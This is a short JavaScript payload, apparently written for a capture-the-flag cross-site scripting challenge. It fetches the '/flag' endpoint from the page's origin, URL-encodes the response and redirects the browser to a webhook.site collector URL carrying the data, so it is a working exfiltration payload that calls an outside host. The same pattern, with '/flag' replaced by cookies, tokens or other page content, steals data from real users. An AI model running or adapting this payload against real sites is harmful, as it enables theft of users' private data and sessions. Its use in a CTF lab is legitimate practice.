async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('/flag');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://webhook.site/371f727f-1132-432d-b19d-079d450dee55');
